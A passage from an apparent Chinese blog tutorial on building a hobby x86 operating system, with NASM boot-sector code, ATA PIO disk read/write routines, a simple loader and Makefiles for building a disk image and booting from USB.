寄存器中写入待操作的扇区数</li><li>往该通道上的三个 LBA 寄存器写入扇区起始地址的低 24 位</li><li>往 device 寄存器中写入 LBA 地址的 24-27 位，并置第6位为1，使其为 LBA 模式，设置第4位，选择操作的硬盘（master 硬盘或 slave 硬盘）</li><li>往该通道上的 command 寄存器写入操作命令</li><li>读取该通道上的 status 寄存器，判断硬盘工作是否完成</li><li>如果以上步骤是读硬盘，进入下 个步骤。否则，完工</li><li>将硬盘数据读出</li></ol><p>数据传送的方式就是操作系统学的了</p><h1 id="操作系统实现从usb启动"><a class="markdownIt-Anchor" href="#操作系统实现从usb启动"></a> [操作系统实现]从usb启动</h1><p>首先把usb插入ubuntu查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsblk #查看挂载</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/a0ba672bb25398b1b273e14353b5acd7.png" alt="image-20220215202235388" /></p><p>格式化usb</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo fdisk /dev/sdb</span><br></pre></td></tr></table></figure><ul><li>d：删除分区</li></ul><p><img src="https://img.joe1sn.top/uploads/big/5b654ab2407427f454bcbbe9492ea0d5.png" alt="image-20220215202628614" /></p><p>可以写makefile如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">boot.bin: boot.asm</span></span><br><span class="line">nasm -f bin boot.asm -o boot.bin</span><br><span class="line"></span><br><span class="line"><span class="section">master.img: boot.bin</span></span><br><span class="line">yes | bximage -hd -mode=<span class="string">&quot;flat&quot;</span> -size=60 -q master.img</span><br><span class="line">dd if=./boot.bin of=master.img bs=512 count=1 conv=notrunc</span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">rm -rf *.bin</span><br><span class="line">rm -rf *.img</span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: usb</span></span><br><span class="line"><span class="section">usb: boot.bin /dev/sdb</span></span><br><span class="line">sudo dd if=/dev/sdb of=tmp.bin bs=512 count=1 conv=notrunc</span><br><span class="line">cp tmp.bin usb.bin</span><br><span class="line">sudo rm tmp.bin</span><br><span class="line">dd if=boot.bin of=usb.bin bs=446 count=1 conv=notrunc</span><br><span class="line">sudo dd if=usb.bin of=/dev/sdb bs=512 count=1 conv=notrunc</span><br><span class="line">rm usb.bin</span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: bochs</span></span><br><span class="line"><span class="section">bochs: master.img</span></span><br><span class="line">bochs -q</span><br></pre></td></tr></table></figure><p>源代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">[org 0x7c00]</span><br><span class="line">;最简单的主程序引导程序</span><br><span class="line">;实模式的启动地址</span><br><span class="line"></span><br><span class="line">;设置屏幕模式为文本模式，清除屏幕</span><br><span class="line">mov ax,3</span><br><span class="line">int 0x10</span><br><span class="line"></span><br><span class="line">;初始化段寄存器</span><br><span class="line">mov ax,0</span><br><span class="line">mov ds,ax</span><br><span class="line">mov es,ax</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,0x7c00</span><br><span class="line"></span><br><span class="line">; xchg bx, bx; bochs魔数断点</span><br><span class="line"></span><br><span class="line">mov si, booting</span><br><span class="line">call print</span><br><span class="line"></span><br><span class="line">;程序悬停</span><br><span class="line">jmp $</span><br><span class="line"></span><br><span class="line">print:</span><br><span class="line">    mov ah, 0xe</span><br><span class="line">.next:</span><br><span class="line">    mov al, [si]</span><br><span class="line">    cmp al, 0</span><br><span class="line">    jz .done</span><br><span class="line">    int 0x10</span><br><span class="line">    inc si</span><br><span class="line">    jmp .next</span><br><span class="line">.done:</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">booting:</span><br><span class="line">    db &quot;Booting Xsys...&quot;,10,13,0; \n\r</span><br><span class="line"></span><br><span class="line">;填充</span><br><span class="line">times 510-($-$$) db 0</span><br><span class="line">db 0x55,0xaa</span><br></pre></td></tr></table></figure><p>弹出过后从VMware创建新的虚拟机启动</p><p>注：要在插入usb后启动vmware，否则vmware无法识别到usb</p><p><img src="https://img.joe1sn.top/uploads/big/6d294d583d0e60a6bbd08348b7813f7d.png" alt="image-20220215204802321" /></p><h1 id="操作系统实现实模式下的print实现"><a class="markdownIt-Anchor" href="#操作系统实现实模式下的print实现"></a> [操作系统实现]实模式下的print实现</h1><p>参数：</p><ul><li><strong>ah</strong>：0xe</li><li><strong>al</strong>：字符</li><li><strong>int 0x10</strong>： 系统调用</li></ul><p>函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">print:</span><br><span class="line">    mov ah, 0xe;功能参数</span><br><span class="line">.next:</span><br><span class="line">    mov al, [si];字符</span><br><span class="line">    cmp al, 0;判断是否为最后一个结尾</span><br><span class="line">    jz .done;结尾跳转至ret</span><br><span class="line">    int 0x10;功能调用</span><br><span class="line">    inc si;地址-1</span><br><span class="line">    jmp .next;继续，下一个</span><br><span class="line">.done:</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/f997bf523a7e9c3097e67bfa0b05cda5.png" alt="image-20220216105159456" /></p><p>完整代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">[org 0x7c00]</span><br><span class="line">;最简单的主程序引导程序</span><br><span class="line">;实模式的启动地址</span><br><span class="line"></span><br><span class="line">;设置屏幕模式为文本模式，清除屏幕</span><br><span class="line">mov ax,3</span><br><span class="line">int 0x10</span><br><span class="line"></span><br><span class="line">;初始化段寄存器</span><br><span class="line">mov ax,0</span><br><span class="line">mov ds,ax</span><br><span class="line">mov es,ax</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,0x7c00</span><br><span class="line"></span><br><span class="line">xchg bx, bx; bochs魔数断点</span><br><span class="line"></span><br><span class="line">mov si, booting</span><br><span class="line">call print</span><br><span class="line"></span><br><span class="line">;程序悬停</span><br><span class="line">jmp $</span><br><span class="line"></span><br><span class="line">print:</span><br><span class="line">    mov ah, 0xe;功能参数</span><br><span class="line">.next:</span><br><span class="line">    mov al, [si];字符</span><br><span class="line">    cmp al, 0;判断是否为最后一个结尾</span><br><span class="line">    jz .done;结尾跳转至ret</span><br><span class="line">    int 0x10;功能调用</span><br><span class="line">    inc si;地址-1</span><br><span class="line">    jmp .next;继续，下一个</span><br><span class="line">.done:</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">booting:</span><br><span class="line">    db &quot;Booting Xsys...&quot;,10,13,0; \n\r</span><br><span class="line"></span><br><span class="line">;填充</span><br><span class="line">times 510-($-$$) db 0</span><br><span class="line">db 0x55,0xaa</span><br></pre></td></tr></table></figure><p>make bochs编译</p><p><img src="https://img.joe1sn.top/uploads/big/c3f08344dfa84978636fa7dac9ed6def.png" alt="image-20220216104837817" /></p><h1 id="操作系统实现硬盘读写"><a class="markdownIt-Anchor" href="#操作系统实现硬盘读写"></a> [操作系统实现]硬盘读写</h1><h2 id="简单的磁盘结构"><a class="markdownIt-Anchor" href="#简单的磁盘结构"></a> 简单的磁盘结构</h2><ul><li>扇区：硬盘读写的最小单位，最多256，最小1个</li><li>性能瓶颈：机械臂的寻道时间</li><li>一般磁道有63个扇区（由于BIOS最大支持）</li><li>一般外侧读写速度最快</li></ul><h2 id="ide-ata-pio-mode"><a class="markdownIt-Anchor" href="#ide-ata-pio-mode"></a> <strong>IDE / ATA PIO Mode</strong></h2><ul><li><p><strong>PIO</strong>：Port Input Output</p><p>Port更多指的是外部设备内部的寄存器</p></li><li><p><strong>IDE</strong>：Intergrated Drive Electronics 集成电子驱动器 （西部数据）</p></li><li><p><strong>ATA</strong>（PATA）：Advanced Technology Attachment（ANSI标准）</p></li><li><p><strong>SATA</strong></p></li></ul><h2 id="硬盘读写模式"><a class="markdownIt-Anchor" href="#硬盘读写模式"></a> <strong>硬盘读写模式</strong></h2><ul><li><p><strong>CHS</strong>： Cylinder / Head / Sector | 柱面 / 磁道 / 扇区</p></li><li><p><strong>LBA</strong>： Logical Block Address | 逻辑块地址</p><p><strong>LBA28</strong>：总共访问 128G的磁盘空间</p><p>两个通道：Primary Secondary</p><ul><li>0x1F0：16bits，用于读写数据</li><li>0x1F1：用于检测前一个指令的错误</li><li>0x1F2：读写扇区的数量，最多256</li><li>0x1F3：起始扇区 0 ~ 7 位</li><li>0x1F4：起始扇区 8~15 位</li><li>0x1F5：起始扇区 16 ~ 23 位</li><li>0x1F6：<ul><li>0 ~ 3：起始扇区 24 ~ 27 位</li><li>4：0–&gt;master主盘；1–&gt;slave从盘</li><li>6：0 CHS模式；1 LBA模式</li><li>5、7：固定 1</li></ul></li><li>0x1F7：<ul><li>out操作<ul><li>0xEC：识别硬盘</li><li>0x20：读硬盘</li><li>0x30：写硬盘</li></ul></li><li>int操作<ul><li>0 ERROR</li><li>3 DRQ 数据准备完毕</li><li>7 BSY 硬盘繁忙</li></ul></li></ul></li></ul></li></ul><p><strong>源代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line">[org 0x7c00]</span><br><span class="line">;最简单的主程序引导程序</span><br><span class="line">;实模式的启动地址</span><br><span class="line"></span><br><span class="line">;设置屏幕模式为文本模式，清除屏幕</span><br><span class="line">mov ax,3</span><br><span class="line">int 0x10</span><br><span class="line"></span><br><span class="line">;初始化段寄存器</span><br><span class="line">mov ax,0</span><br><span class="line">mov ds,ax</span><br><span class="line">mov es,ax</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,0x7c00</span><br><span class="line"></span><br><span class="line">mov edi, 0x1000  ; 读到的目标内存</span><br><span class="line">mov ecx, 0       ; 起始扇区</span><br><span class="line">mov bl,1         ;扇区数量</span><br><span class="line">call read_disk</span><br><span class="line"></span><br><span class="line">xchg bx, bx; bochs魔数断点</span><br><span class="line">mov edi, 0x1000  ; src的目标内存</span><br><span class="line">mov ecx, 2       ; 起始扇区</span><br><span class="line">mov bl,1         ;扇区数量</span><br><span class="line">call write_disk</span><br><span class="line"></span><br><span class="line">mov si, booting</span><br><span class="line">call print</span><br><span class="line"></span><br><span class="line">;程序悬停</span><br><span class="line">jmp $</span><br><span class="line"></span><br><span class="line">;读取硬盘</span><br><span class="line">read_disk:</span><br><span class="line">    ;设置读写扇区数量</span><br><span class="line">    ;0x1f2端口=1</span><br><span class="line">    mov dx, 0x1f2</span><br><span class="line">    mov al, bl</span><br><span class="line">    out dx, al</span><br><span class="line"></span><br><span class="line">    ;-----------------------------------------</span><br><span class="line">    ;0x1f3端口= 00000000</span><br><span class="line">    inc dx; 0x1f3</span><br><span class="line">    mov al, cl ;起始扇区的前8位</span><br><span class="line">    out dx, al</span><br><span class="line"></span><br><span class="line">    ;0x1f4端口= 00000000</span><br><span class="line">    inc dx; 0x1f4</span><br><span class="line">    shr ecx, 8</span><br><span class="line">    mov al, cl ;起始扇区的中8位</span><br><span class="line">    out dx, al</span><br><span class="line"></span><br><span class="line">    ;0x1f5端口= 00000000</span><br><span class="line">    inc dx; 0x1f5</span><br><span class="line">    shr ecx, 8</span><br><span class="line">    mov al, cl ;起始扇区的高8位</span><br><span class="line">    out dx, al</span><br><span class="line">    ;起始扇区24位：00000000_00000000_00000000</span><br><span class="line">    ;-----------------------------------------</span><br><span class="line"></span><br><span class="line">    inc dx;0x1f6</span><br><span class="line">    shr ecx, 8</span><br><span class="line">    and cl, 0b1111;高4位置0</span><br><span class="line">    mov al, 0b1110_0000;</span><br><span class="line">    or al, cl; cl拼接到al后面</span><br><span class="line"></span><br><span class="line">    out dx, al;主盘 LBA模式设置</span><br><span class="line"></span><br><span class="line">    ;0x1f7端口= 0x20;表示读硬盘</span><br><span class="line">    inc dx;0x1f7</span><br><span class="line">    mov al,0x20;读硬盘</span><br><span class="line">    out dx,al</span><br><span class="line"></span><br><span class="line">    xor ecx, ecx;清空exc</span><br><span class="line">    mov cl, bl;得到读写扇区的数量</span><br><span class="line"></span><br><span class="line">    .read:</span><br><span class="line">        push cx;保存cx</span><br><span class="line">        call .waits;等待数据准备完毕</span><br><span class="line">        call .reads;读取一个扇区</span><br><span class="line">        pop cx</span><br><span class="line">        loop .read</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">    .waits:</span><br><span class="line">        mov dx, 0x1f7</span><br><span class="line">        .check:</span><br><span class="line">            in al, dx</span><br><span class="line">            jmp $+2; nop等价，直接跳下一行</span><br><span class="line">            jmp $+2; 制造一点点延迟</span><br><span class="line">            jmp $+2; </span><br><span class="line">            and al, 0b1000_1000; 与操作，只剩下3,7位</span><br><span class="line">            cmp al, 0b0000_1000; 比较3,7位，确保硬盘准备就绪</span><br><span class="line">            jnz .check</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line">    .reads:</span><br><span class="line">        mov dx, 0x1f0</span><br><span class="line">        mov cx, 256;一个扇区是256字</span><br><span class="line">        .readw:</span><br><span class="line">            in ax, dx</span><br><span class="line">            jmp $+2; nop等价，直接跳下一行</span><br><span class="line">            jmp $+2; 制造一点点延迟</span><br><span class="line">            jmp $+2;</span><br><span class="line">            mov [edi], ax</span><br><span class="line">            add edi, 2</span><br><span class="line">            loop .readw</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line">;写硬盘</span><br><span class="line">write_disk:</span><br><span class="line">    ;设置读写扇区数量</span><br><span class="line">    ;0x1f2端口=1</span><br><span class="line">    mov dx, 0x1f2</span><br><span class="line">    mov al, bl</span><br><span class="line">    out dx, al</span><br><span class="line"></span><br><span class="line">    ;-----------------------------------------</span><br><span class="line">    ;0x1f3端口= 00000000</span><br><span class="line">    inc dx; 0x1f3</span><br><span class="line">    mov al, cl ;起始扇区的前8位</span><br><span class="line">    out dx, al</span><br><span class="line"></span><br><span class="line">    ;0x1f4端口= 00000000</span><br><span class="line">    inc dx; 0x1f4</span><br><span class="line">    shr ecx, 8</span><br><span class="line">    mov al, cl ;起始扇区的中8位</span><br><span class="line">    out dx, al</span><br><span class="line"></span><br><span class="line">    ;0x1f5端口= 00000000</span><br><span class="line">    inc dx; 0x1f5</span><br><span class="line">    shr ecx, 8</span><br><span class="line">    mov al, cl ;起始扇区的高8位</span><br><span class="line">    out dx, al</span><br><span class="line">    ;起始扇区24位：00000000_00000000_00000000</span><br><span class="line">    ;-----------------------------------------</span><br><span class="line"></span><br><span class="line">    inc dx;0x1f6</span><br><span class="line">    shr ecx, 8</span><br><span class="line">    and cl, 0b1111;高4位置0</span><br><span class="line">    mov al, 0b1110_0000;</span><br><span class="line">    or al, cl; cl拼接到al后面</span><br><span class="line"></span><br><span class="line">    out dx, al;主盘 LBA模式设置</span><br><span class="line"></span><br><span class="line">    ;0x1f7端口= 0x20;表示读硬盘</span><br><span class="line">    inc dx;0x1f7</span><br><span class="line">    mov al,0x30;读硬盘</span><br><span class="line">    out dx,al</span><br><span class="line"></span><br><span class="line">    xor ecx, ecx;清空exc</span><br><span class="line">    mov cl, bl;得到读写扇区的数量</span><br><span class="line"></span><br><span class="line">    .write:</span><br><span class="line">        push cx;保存cx</span><br><span class="line">        call .writes;写一个扇区</span><br><span class="line">        call .waits;等待繁忙</span><br><span class="line">        pop cx</span><br><span class="line">        loop .write</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">    .waits:</span><br><span class="line">        mov dx, 0x1f7</span><br><span class="line">        .check:</span><br><span class="line">            in al, dx</span><br><span class="line">            jmp $+2; nop等价，直接跳下一行</span><br><span class="line">            jmp $+2; 制造一点点延迟</span><br><span class="line">            jmp $+2; </span><br><span class="line">            and al, 0b1000_0000; 与操作，只剩下7位</span><br><span class="line">            cmp al, 0b0000_0000; 比较7位，确保硬盘准备就绪</span><br><span class="line">            jnz .check</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line">    .writes:</span><br><span class="line">        mov dx, 0x1f0</span><br><span class="line">        mov cx, 256;一个扇区是256字</span><br><span class="line">        .writew:</span><br><span class="line">            mov ax, [edi]</span><br><span class="line">            out dx, ax</span><br><span class="line">            jmp $+2; nop等价，直接跳下一行</span><br><span class="line">            jmp $+2; 制造一点点延迟</span><br><span class="line">            jmp $+2;</span><br><span class="line">            add edi, 2</span><br><span class="line">            loop .writew</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;实模式的打印</span><br><span class="line">print:</span><br><span class="line">    mov ah, 0xe;功能参数</span><br><span class="line">    .next:</span><br><span class="line">        mov al, [si];字符</span><br><span class="line">        cmp al, 0;判断是否为最后一个结尾</span><br><span class="line">        jz .done;结尾跳转至ret</span><br><span class="line">        int 0x10;功能调用</span><br><span class="line">        inc si;地址-1</span><br><span class="line">        jmp .next;继续，下一个</span><br><span class="line">    .done:</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line">booting:</span><br><span class="line">    db &quot;Booting Xsys...&quot;,10,13,0; \n\r</span><br><span class="line"></span><br><span class="line">;填充</span><br><span class="line">times 510-($-$$) db 0</span><br><span class="line">db 0x55,0xaa</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/11940789a6a0ef2814825d08d8968fbe.png" alt="image-20220217105917679" /></p><h1 id="操作系统实现-内核加载器"><a class="markdownIt-Anchor" href="#操作系统实现-内核加载器"></a> 操作系统实现-内核加载器</h1><p><strong>基本步骤</strong></p><ul><li>写内核加载器 loader</li><li>将loader加载到硬盘</li><li>在主引导扇区读入</li><li>检测正确性</li></ul><p><strong>x86实模式下内存布局</strong></p><p><img src="https://img-blog.csdnimg.cn/20190405014442888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2phZGVzaHU=,size_16,color_FFFFFF,t_70" alt="" /></p><p>假设我们的bootloader如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[org 0x1000];实模式下的其实地址</span><br><span class="line">dw 0x55aa; 魔数，用于判断错误</span><br><span class="line"></span><br><span class="line">mov si,loading</span><br><span class="line">call print</span><br><span class="line"></span><br><span class="line">jmp $</span><br><span class="line"></span><br><span class="line">print:</span><br><span class="line">    mov ah, 0xe;功能参数</span><br><span class="line">    .next:</span><br><span class="line">        mov al, [si];字符</span><br><span class="line">        cmp al, 0;判断是否为最后一个结尾</span><br><span class="line">        jz .done;结尾跳转至ret</span><br><span class="line">        int 0x10;功能调用</span><br><span class="line">        inc si;地址-1</span><br><span class="line">        jmp .next;继续，下一个</span><br><span class="line">    .done:</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line">loading:</span><br><span class="line">    db &quot;Kernel Booting Up...&quot;,10,13,0</span><br></pre></td></tr></table></figure><p>这是可以修改下makefile文件</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">%.bin: %.asm</span></span><br><span class="line">nasm -f bin <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">master.img: boot.bin loader.bin</span></span><br><span class="line">yes | bximage -hd -mode=<span class="string">&quot;flat&quot;</span> -size=60 -q master.img</span><br><span class="line">dd if=./boot.bin of=master.img bs=512 count=1 conv=notrunc</span><br><span class="line">dd if=./loader.bin of=master.img bs=512 count=4 seek=2 conv=notrunc</span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">rm -rf *.bin</span><br><span class="line">rm -rf *.img</span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: usb</span></span><br><span class="line"><span class="section">usb: boot.bin /dev/sdb</span></span><br><span class="line">sudo dd if=/dev/sdb of=tmp.bin bs=512 count=1 conv=notrunc</span><br><span class="line">cp tmp.bin usb.bin</span><br><span class="line">sudo rm tmp.bin</span><br><span class="line">dd if=boot.bin of=usb.bin bs=446 count=1 conv=notrunc</span><br><span class="line">sudo dd if=usb.bin of=/dev/sdb bs=512 count=1 conv=notrunc</span><br><span class="line">rm usb.bin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: bochs</span></span><br><span class="line"><span class="section">bochs: master.img</span></span><br><span class="line">bochs -q</span><br></pre></td></tr></table></figure><p>这样我们使用<code>make loader.bin</code>就能生成loader.bin了</p><p>同时：<code>dd if=./loader.bin of=master.img bs=512 count=4 seek=2 conv=notrunc</code>将loader写到第二扇区，写512*4字节大小</p><p>接着我们修改主程序，逻辑如下</p><ul><li>读取第二扇区到<strong>实模式下的可用内存</strong>并验证&quot;\x55\xaa&quot;校验位</li><li>jmp到内存执行</li></ul><p><img src="https://img.joe1sn.top/uploads/big/6f239f390c16170e0cf5eb5338ac8ab0.png" alt="image-20220218212910546" /></p><p>得到新的boot.asm</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 